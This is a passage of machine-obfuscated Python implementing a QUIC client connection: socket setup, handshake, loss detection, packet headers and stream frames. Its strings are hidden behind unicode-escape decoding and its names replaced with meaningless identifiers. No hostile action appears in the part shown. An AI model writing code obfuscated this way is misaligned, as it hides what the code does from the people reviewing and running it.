        self.stats = {codecs.decode('\\u0072\\u0078', 'unicode_escape'): 0, codecs.decode('\\u0074\\u0078', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0078\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'): 0, codecs.decode('\\u0074\\u0078\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'): 0, codecs.decode('\\u0064\\u0072\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0073', 'unicode_escape'): 0}
        self._thread = None
        self._finish_timer = None

    @property
    def stopped(self):
        return self._stopped_flag

    @stopped.setter
    def stopped(self, value):
        self._stopped_flag = bool(value)
        if self._stopped_flag and (not self.closed) and (not self.closing):
            self.close(codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))

    def connect(self, timeout=20):
        self.settle = self.handshake_event
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((codecs.decode('\\u0030\\u002e\\u0030\\u002e\\u0030\\u002e\\u0030', 'unicode_escape'), 0))
        self.sock.settimeout(0.02)
        O0_var_1276 = socket.getaddrinfo(self.host, self.port, socket.AF_INET, socket.SOCK_DGRAM)[0][4]
        self._send_addr = (O0_var_1276[0], self.port)
        self.keys[QUIC_EPOCH_INITIAL] = O0_fn_36(self.peer_cid, True)
        self.crypto_send[QUIC_EPOCH_INITIAL].append(self.tls.build_client_hello(), False)
        O0_var_1277 = time.time() * 1000
        self.last_received = O0_var_1277
        self.last_eliciting = O0_var_1277
        self.log.debug(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0064\\u0069\\u0061\\u006c\\u0020\\u0025\\u0073\\u003a\\u0025\\u0064\\u0020\\u0061\\u006c\\u0070\\u006e\\u003d\\u0025\\u0073\\u0020\\u0064\\u0063\\u0069\\u0064\\u003d\\u0025\\u0073', 'unicode_escape'), self.host, self.port, self.alpn, self.peer_cid.hex())
        self._thread = threading.Thread(target=self._run_loop, daemon=True, name=codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u002d\\u0063\\u006f\\u006e\\u006e', 'unicode_escape'))
        self._thread.start()
        if not self.handshake_event.wait(timeout):
            if not self.closed:
                self._fail(codecs.decode('\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u0020\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'))
            raise OSError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (self.closed or codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape')))
        if self.closed:
            raise OSError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % self.closed)
        return self

    def _run_loop(self):
        try:
            while not self.closed:
                try:
                    O0_var_1278, O0_var_1279 = self.sock.recvfrom(65536)
                except socket.timeout:
                    O0_var_1278 = None
                except OSError:
                    break
                try:
                    if O0_var_1278:
                        self._on_datagram(O0_var_1278)
                    if not self.closed:
                        self._tick()
                except Exception as exc:
                    self._fail(codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % (exc,))
        finally:
            O0_var_1280 = self.sock
            if O0_var_1280 is not None:
                try:
                    O0_var_1280.close()
                except OSError:
                    pass

    def on_send_progress(self):
        self.retransmits = 0
        self.pto_count = 0

    def open_stream(self):
        O0_var_1281 = QuicStream(self, self.next_local_stream, codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'))
        self.next_local_stream += 4
        self.streams[O0_var_1281.id] = O0_var_1281
        return O0_var_1281

    def send_data(self, O0_var_1282, O0_var_1283, O0_var_1284=False):
        O0_var_1285 = self.streams.get(O0_var_1282)
        if O0_var_1285 is None:
            raise ValueError(codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0064', 'unicode_escape') % O0_var_1282)
        O0_var_1285.write(O0_var_1283, O0_var_1284)

    def mark_send_ready(self, O0_var_1286):
        if O0_var_1286 not in self.send_ready:
            self.send_ready.append(O0_var_1286)

    def close(self, reason=None):
        if self.closed:
            return
        self.closing = True
        self.close_reason = reason or codecs.decode('\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape')
        self._tick()
        self._finish_timer = threading.Timer(0.2, self._finish, args=(None,))
        self._finish_timer.daemon = True
        self._finish_timer.start()

    def _tick(self):
        if self.closed:
            return
        O0_var_1287 = time.time() * 1000
        self._check_loss(O0_var_1287)
        if self.keep_alive and self.handshake_complete and (O0_var_1287 - self.last_eliciting >= self.keep_alive):
            self.ping_pending = True
        O0_var_1288 = 0
        while O0_var_1288 < 16 and self._total_in_flight() < self.max_inflight and (self._in_flight_bytes() < self._send_window() or self._ack_due() or self.closing):
            O0_var_1289 = self._build_packet()
            if O0_var_1289 is None:
                break
            self._transmit(O0_var_1289)
            O0_var_1288 += 1
        if O0_var_1287 - self.last_received > max(self.idle_timeout, 15000):
            self._fail(codecs.decode('\\u0070\\u0065\\u0065\\u0072\\u0020\\u0069\\u0064\\u006c\\u0065\\u0020\\u0066\\u006f\\u0072\\u0020\\u0025\\u0064\\u006d\\u0073', 'unicode_escape') % int(O0_var_1287 - self.last_received))

    def _total_in_flight(self):
        return sum((len(self.in_flight[O0_var_1290]) for O0_var_1290 in range(3)))

    def _ack_due(self):
        for O0_var_1291 in range(3):
            if self.keys[O0_var_1291] is not None and self.ack_pending[O0_var_1291] and self.recv_ranges[O0_var_1291]:
                return True
        return False

    def _in_flight_bytes(self):
        return sum((O0_var_1293[codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')] for O0_var_1292 in range(3) for O0_var_1293 in self.in_flight[O0_var_1292]))

    def _send_window(self):
        return self.congestion_window if self.handshake_complete else float(codecs.decode('\\u0069\\u006e\\u0066', 'unicode_escape'))

    def _pto_duration(self):
        return max(self.pto * 2 ** self.pto_count, 20)

    def _record_rtt_sample(self, O0_var_1294):
        if self.srtt is None:
            self.srtt = O0_var_1294
            self.rttvar = O0_var_1294 / 2
        else:
            self.rttvar = (self.rttvar * 3 + abs(self.srtt - O0_var_1294)) / 4
            self.srtt = (self.srtt * 7 + O0_var_1294) / 8
        self.pto = round(self.srtt + 4 * self.rttvar + self.peer_max_ack_delay)

    def _on_loss(self, O0_var_1295):
        self.slow_start_threshold = max(self.congestion_window // 2, 2 * self.min_window)
        self.congestion_window = self.min_window

    def _check_loss(self, O0_var_1296):
        for O0_var_1297 in range(3):
            O0_var_1298 = self.in_flight[O0_var_1297]
            if not O0_var_1298:
                continue
            if O0_var_1296 - O0_var_1298[0][codecs.decode('\\u0074\\u0069\\u006d\\u0065', 'unicode_escape')] < self._pto_duration():
                continue
            O0_var_1299 = O0_var_1298[0]
            self.in_flight[O0_var_1297] = O0_var_1298[1:]
            self._return_lost(O0_var_1297, O0_var_1299)
            self.retransmits += 1
            self.stats[codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0073', 'unicode_escape')] += 1
            self.pto_count += 1
            if self.retransmits > 24:
                self._fail(codecs.decode('\\u006e\\u006f\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u0020\\u0061\\u0066\\u0074\\u0065\\u0072\\u0020\\u0025\\u0064\\u0020\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0073', 'unicode_escape') % self.retransmits)
                return

    def _return_lost(self, O0_var_1300, O0_var_1301):
        if O0_var_1301[codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')]:
            self.crypto_send[O0_var_1300].loss_ranges([O0_var_1301[codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')]])
        for O0_var_1302 in O0_var_1301[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape')]:
            O0_var_1302[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].send.loss_ranges([{codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1302[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1302[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]}])
            if O0_var_1302[codecs.decode('\\u0066\\u0069\\u006e', 'unicode_escape')]:
                O0_var_1302[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].send.loss_ranges([{codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1302[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1302[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')], codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): 0, codecs.decode('\\u0066\\u0069\\u006e', 'unicode_escape'): True}])
            self.mark_send_ready(O0_var_1302[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')])

    def _discard_epoch(self, O0_var_1303, reason):
        if self.keys[O0_var_1303] is None:
            return
        self.keys[O0_var_1303] = None
        self.in_flight[O0_var_1303] = []
        self.log.debug(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u0020\\u0064\\u0069\\u0073\\u0063\\u0061\\u0072\\u0064\\u0065\\u0064\\u0020\\u0025\\u0073\\u0020\\u006b\\u0065\\u0079\\u0073\\u0020\\u0028\\u0025\\u0073\\u0029', 'unicode_escape'), QUIC_EPOCH_NAMES[O0_var_1303], reason)

    def _flush_handshake_ack(self):
        O0_var_1304 = QUIC_EPOCH_HANDSHAKE
        O0_var_1305 = self.keys[O0_var_1304]
        if O0_var_1305 is None or not self.ack_pending[O0_var_1304] or (not self.recv_ranges[O0_var_1304]):
            return
        O0_var_1306 = _quic_encode_ack(self.recv_ranges[O0_var_1304][-16:])
        self.ack_pending[O0_var_1304] = False
        O0_var_1307 = self.pn_send[O0_var_1304]
        self.pn_send[O0_var_1304] += 1
        O0_var_1308 = self._header(O0_var_1304, QUIC_PN_LEN + len(O0_var_1306) + 16, O0_var_1307)
        O0_var_1309 = O0_var_1308[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072', 'unicode_escape')] + O0_var_1308[codecs.decode('\\u0070\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')]
        O0_var_1310 = O0_var_1309 + O0_var_1305[codecs.decode('\\u0073\\u0065\\u006e\\u0064', 'unicode_escape')].seal(O0_var_1307, O0_var_1309, O0_var_1306)
        O0_var_1311 = _quic_apply_protection(O0_var_1305[codecs.decode('\\u0073\\u0065\\u006e\\u0064', 'unicode_escape')], O0_var_1310, O0_var_1308[codecs.decode('\\u0070\\u006e\\u005f\\u006f\\u0066\\u0066\\u0073\\u0065\\u0074', 'unicode_escape')], O0_var_1308[codecs.decode('\\u006c\\u006f\\u006e\\u0067', 'unicode_escape')])
        if O0_var_1311 is None:
            self.ack_pending[O0_var_1304] = True
            return
        self._transmit({codecs.decode('\\u0065\\u0070\\u006f\\u0063\\u0068', 'unicode_escape'): O0_var_1304, codecs.decode('\\u0070\\u0061\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'): O0_var_1311, codecs.decode('\\u0070\\u006e', 'unicode_escape'): O0_var_1307, codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'): {codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape'): None, codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape'): []}, codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0065\\u006c\\u0069\\u0063\\u0069\\u0074\\u0069\\u006e\\u0067', 'unicode_escape'): False})

    def _confirm_handshake(self):
        if self.confirmed or not self.handshake_complete or (not self.finished_sent):
            return
        self._flush_handshake_ack()
        self.confirmed = True
        self._discard_epoch(QUIC_EPOCH_HANDSHAKE, codecs.decode('\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u0020\\u0063\\u006f\\u006e\\u0066\\u0069\\u0072\\u006d\\u0065\\u0064', 'unicode_escape'))
        self._discard_epoch(QUIC_EPOCH_INITIAL, codecs.decode('\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065\\u0020\\u0063\\u006f\\u006e\\u0066\\u0069\\u0072\\u006d\\u0065\\u0064', 'unicode_escape'))

    def _header_overhead(self, O0_var_1312):
        O0_var_1313 = 16
        if O0_var_1312 == QUIC_EPOCH_APPLICATION:
            return 1 + len(self.peer_cid) + QUIC_PN_LEN + O0_var_1313
        if O0_var_1312 == QUIC_EPOCH_HANDSHAKE:
            return 1 + 4 + 1 + len(self.peer_cid) + 1 + len(self.our_cid) + 2 + QUIC_PN_LEN + O0_var_1313
        return 1 + 4 + 1 + len(self.peer_cid) + 1 + len(self.our_cid) + O0_fn_31(len(self.peer_token)) + len(self.peer_token) + 2 + QUIC_PN_LEN + O0_var_1313

    def _header(self, O0_var_1314, O0_var_1315, O0_var_1316):
        O0_var_1317 = O0_var_1316.to_bytes(QUIC_PN_LEN, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        if O0_var_1314 == QUIC_EPOCH_APPLICATION:
            O0_var_1318 = 64 | self.app_key_phase << 2 | QUIC_PN_LEN - 1
            O0_var_1319 = bytes([O0_var_1318]) + self.peer_cid
            return {codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072', 'unicode_escape'): O0_var_1319, codecs.decode('\\u0070\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'): O0_var_1317, codecs.decode('\\u0070\\u006e\\u005f\\u006f\\u0066\\u0066\\u0073\\u0065\\u0074', 'unicode_escape'): 1 + len(self.peer_cid), codecs.decode('\\u006c\\u006f\\u006e\\u0067', 'unicode_escape'): False}
        O0_var_1320 = 0 if O0_var_1314 == QUIC_EPOCH_INITIAL else 2
        O0_var_1321 = bytearray([192 | O0_var_1320 << 4 | QUIC_PN_LEN - 1])
        O0_var_1321 += QUIC_VERSION.to_bytes(4, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_1321.append(len(self.peer_cid))
        O0_var_1321 += self.peer_cid
        if O0_var_1314 == QUIC_EPOCH_INITIAL:
            O0_var_1321.append(len(self.our_cid))
            O0_var_1321 += self.our_cid
            O0_var_1321 += O0_fn_32(len(self.peer_token))
            if self.peer_token:
                O0_var_1321 += self.peer_token
        else:
            O0_var_1321.append(0)
        O0_var_1321 += (16384 | O0_var_1315).to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_1319 = bytes(O0_var_1321)
        return {codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072', 'unicode_escape'): O0_var_1319, codecs.decode('\\u0070\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'): O0_var_1317, codecs.decode('\\u0070\\u006e\\u005f\\u006f\\u0066\\u0066\\u0073\\u0065\\u0074', 'unicode_escape'): len(O0_var_1319), codecs.decode('\\u006c\\u006f\\u006e\\u0067', 'unicode_escape'): True}

    def _pick_epoch(self):
        for O0_var_1322 in (QUIC_EPOCH_INITIAL, QUIC_EPOCH_HANDSHAKE, QUIC_EPOCH_APPLICATION):
            if self.keys[O0_var_1322] is None:
                continue
            if self.ack_pending[O0_var_1322] and self.recv_ranges[O0_var_1322]:
                return O0_var_1322
            if any((O0_var_1323[codecs.decode('\\u0065\\u0070\\u006f\\u0063\\u0068', 'unicode_escape')] == O0_var_1322 for O0_var_1323 in self.pending_one_off)):
                return O0_var_1322
            if self.crypto_send[O0_var_1322].pending:
                return O0_var_1322
            if O0_var_1322 == QUIC_EPOCH_APPLICATION and (self.send_ready or self.credit_ready or self.ping_pending or self.closing):
                return O0_var_1322
        return -1

    def _build_packet(self):
        O0_var_1324 = self._pick_epoch()
        if O0_var_1324 < 0:
            return None
        O0_var_1325 = self.max_packet - self._header_overhead(O0_var_1324)
        if O0_var_1325 < 16:
            return None
        O0_var_1326 = []
        O0_var_1327 = {codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape'): None, codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape'): [], codecs.decode('\\u0070\\u0069\\u006e\\u0067', 'unicode_escape'): False, codecs.decode('\\u0063\\u006c\\u006f\\u0073\\u0069\\u006e\\u0067', 'unicode_escape'): False, codecs.decode('\\u006f\\u006e\\u0065\\u005f\\u006f\\u0066\\u0066', 'unicode_escape'): False}
        if self.ack_pending[O0_var_1324] and self.recv_ranges[O0_var_1324]:
            O0_var_1328 = _quic_encode_ack(self.recv_ranges[O0_var_1324][-16:])
            O0_var_1326.append(O0_var_1328)
            O0_var_1325 -= len(O0_var_1328)
            self.ack_pending[O0_var_1324] = False
        for O0_var_1329 in [O0_var_1329 for O0_var_1329 in self.pending_one_off if O0_var_1329[codecs.decode('\\u0065\\u0070\\u006f\\u0063\\u0068', 'unicode_escape')] == O0_var_1324]:
            if len(O0_var_1329[codecs.decode('\\u0066\\u0072\\u0061\\u006d\\u0065', 'unicode_escape')]) > O0_var_1325 - 16:
                break
            O0_var_1326.append(O0_var_1329[codecs.decode('\\u0066\\u0072\\u0061\\u006d\\u0065', 'unicode_escape')])
            O0_var_1325 -= len(O0_var_1329[codecs.decode('\\u0066\\u0072\\u0061\\u006d\\u0065', 'unicode_escape')])
            self.pending_one_off.remove(O0_var_1329)
            O0_var_1327[codecs.decode('\\u006f\\u006e\\u0065\\u005f\\u006f\\u0066\\u0066', 'unicode_escape')] = True
        O0_var_1330 = self.crypto_send[O0_var_1324]
        if O0_var_1330.pending and O0_var_1325 > 16:
            O0_var_1331 = O0_var_1330.take(O0_var_1325 - 12)
            O0_var_1328 = bytes([QUIC_FRAME[codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')]]) + O0_fn_32(O0_var_1331[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')]) + O0_fn_32(O0_var_1331[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]) + O0_var_1331[codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')]
            O0_var_1326.append(O0_var_1328)
            O0_var_1325 -= len(O0_var_1328)
            O0_var_1327[codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')] = O0_var_1331
        if O0_var_1324 == QUIC_EPOCH_APPLICATION:
            self._credit_frames(O0_var_1326, O0_var_1325)
            self._stream_frames(O0_var_1326, O0_var_1327, min(O0_var_1325, max(0, self._send_window() - self._in_flight_bytes())))
        if O0_var_1324 == QUIC_EPOCH_APPLICATION and self.closing:
            O0_var_1332 = (self.close_reason or codecs.decode('\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape')).encode()[:64]
            O0_var_1326.append(bytes([QUIC_FRAME[codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u005f\\u0063\\u006c\\u006f\\u0073\\u0065', 'unicode_escape')]]) + O0_fn_32(0) + O0_fn_32(0) + O0_var_1332)
            O0_var_1327[codecs.decode('\\u0063\\u006c\\u006f\\u0073\\u0069\\u006e\\u0067', 'unicode_escape')] = True
        elif O0_var_1324 == QUIC_EPOCH_APPLICATION and self.ping_pending:
            O0_var_1326.append(bytes([QUIC_FRAME[codecs.decode('\\u0070\\u0069\\u006e\\u0067', 'unicode_escape')]]))
            self.ping_pending = False
            O0_var_1327[codecs.decode('\\u0070\\u0069\\u006e\\u0067', 'unicode_escape')] = True
        if not O0_var_1326:
            return None
        O0_var_1333 = b''.join(O0_var_1326)
        if O0_var_1324 == QUIC_EPOCH_INITIAL and (not self.handshake_complete):
            O0_var_1334 = QUIC_MIN_INITIAL - self._header_overhead(O0_var_1324) - len(O0_var_1333)
            if O0_var_1334 > 0:
                O0_var_1333 += bytes(O0_var_1334)
        O0_var_1335 = self.pn_send[O0_var_1324]
        self.pn_send[O0_var_1324] += 1
        O0_var_1336 = self.app_send_keys[self.app_key_phase] if O0_var_1324 == QUIC_EPOCH_APPLICATION else self.keys[O0_var_1324][codecs.decode('\\u0073\\u0065\\u006e\\u0064', 'unicode_escape')]
        O0_var_1337 = self._header(O0_var_1324, QUIC_PN_LEN + len(O0_var_1333) + 16, O0_var_1335)
        O0_var_1338 = O0_var_1337[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072', 'unicode_escape')] + O0_var_1337[codecs.decode('\\u0070\\u006e\\u005f\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')]
        O0_var_1339 = O0_var_1338 + O0_var_1336.seal(O0_var_1335, O0_var_1338, O0_var_1333)
        O0_var_1340 = _quic_apply_protection(O0_var_1336, O0_var_1339, O0_var_1337[codecs.decode('\\u0070\\u006e\\u005f\\u006f\\u0066\\u0066\\u0073\\u0065\\u0074', 'unicode_escape')], O0_var_1337[codecs.decode('\\u006c\\u006f\\u006e\\u0067', 'unicode_escape')])
        if O0_var_1340 is None:
            self._fail(codecs.decode('\\u0070\\u0061\\u0063\\u006b\\u0065\\u0074\\u0020\\u0074\\u006f\\u006f\\u0020\\u0073\\u006d\\u0061\\u006c\\u006c\\u0020\\u0066\\u006f\\u0072\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0020\\u0070\\u0072\\u006f\\u0074\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0073\\u0061\\u006d\\u0070\\u006c\\u0065', 'unicode_escape'))
            return None
        return {codecs.decode('\\u0065\\u0070\\u006f\\u0063\\u0068', 'unicode_escape'): O0_var_1324, codecs.decode('\\u0070\\u0061\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'): O0_var_1340, codecs.decode('\\u0070\\u006e', 'unicode_escape'): O0_var_1335, codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'): O0_var_1327, codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0065\\u006c\\u0069\\u0063\\u0069\\u0074\\u0069\\u006e\\u0067', 'unicode_escape'): bool(O0_var_1327[codecs.decode('\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f', 'unicode_escape')] or O0_var_1327[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape')] or O0_var_1327[codecs.decode('\\u0070\\u0069\\u006e\\u0067', 'unicode_escape')] or O0_var_1327[codecs.decode('\\u0063\\u006c\\u006f\\u0073\\u0069\\u006e\\u0067', 'unicode_escape')] or O0_var_1327[codecs.decode('\\u006f\\u006e\\u0065\\u005f\\u006f\\u0066\\u0066', 'unicode_escape')])}

    def _credit_frames(self, O0_var_1341, O0_var_1342):
        if self.credit_max_data and O0_var_1342 > 12:
            O0_var_1341.append(bytes([QUIC_FRAME[codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')]]) + O0_fn_32(self.local_max_data))
            self.credit_max_data = False
        for O0_var_1343 in list(self.credit_ready):
            if O0_var_1342 < 20:
                break
            O0_var_1341.append(bytes([QUIC_FRAME[codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')]]) + O0_fn_32(O0_var_1343.id) + O0_fn_32(O0_var_1343.local_limit))
            self.credit_ready.remove(O0_var_1343)

    def _peer_stream_limit(self, O0_var_1344):
        if O0_var_1344.peer_limit:
            return O0_var_1344.peer_limit
        return self.peer_stream_remote if O0_var_1344.initiator == codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape') else self.peer_stream_local

    def _stream_frames(self, O0_var_1345, O0_var_1346, O0_var_1347):
        for O0_var_1348 in list(self.send_ready):
            if O0_var_1347 < 24:
                break
            O0_var_1349 = min(self.peer_max_data - self.connection_sent, self._peer_stream_limit(O0_var_1348) - O0_var_1348.sent_end)
            if O0_var_1349 <= 0:
                break
            O0_var_1350 = O0_var_1348.send.take(min(O0_var_1347 - 20, O0_var_1349))
            if O0_var_1350 is None:
                if O0_var_1348.send.take_fin():
                    O0_var_1345.append(bytes([QUIC_FRAME[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')] | 4 | 2 | 1]) + O0_fn_32(O0_var_1348.id) + O0_fn_32(len(O0_var_1348.send.data)) + O0_fn_32(0))
                    O0_var_1346[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape')].append({codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'): O0_var_1348, codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): len(O0_var_1348.send.data), codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): 0, codecs.decode('\\u0066\\u0069\\u006e', 'unicode_escape'): True})
                elif O0_var_1348 in self.send_ready:
                    self.send_ready.remove(O0_var_1348)
                continue
            O0_var_1351 = O0_var_1350[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1350[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] >= len(O0_var_1348.send.data)
            O0_var_1352 = 4 | 2 | (1 if O0_var_1351 and O0_var_1348.send.fin else 0)
            O0_var_1345.append(bytes([QUIC_FRAME[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')] | O0_var_1352]) + O0_fn_32(O0_var_1348.id) + O0_fn_32(O0_var_1350[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')]) + O0_fn_32(O0_var_1350[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')]) + O0_var_1350[codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')])
            O0_var_1346[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073', 'unicode_escape')].append({codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'): O0_var_1348, codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1350[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')], codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1350[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')], codecs.decode('\\u0066\\u0069\\u006e', 'unicode_escape'): O0_var_1351 and O0_var_1348.send.fin, codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_1350[codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0061\\u006e\\u0073\\u006d\\u0069\\u0074\\u0074\\u0065\\u0064', 'unicode_escape')]})
            O0_var_1353 = max(0, O0_var_1350[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1350[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] - O0_var_1348.sent_end)
            O0_var_1348.sent_end = max(O0_var_1348.sent_end, O0_var_1350[codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')] + O0_var_1350[codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')])
            self.connection_sent += O0_var_1353
            if O0_var_1348.send.idle() and O0_var_1348 in self.send_ready:
                self.send_ready.remove(O0_var_1348)

    def _transmit(self, O0_var_1354):
        if self.sock is None or self.closed:
            return
        try:
            self.sock.sendto(O0_var_1354[codecs.decode('\\u0070\\u0061\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')], self._send_addr)
        except OSError as exc:
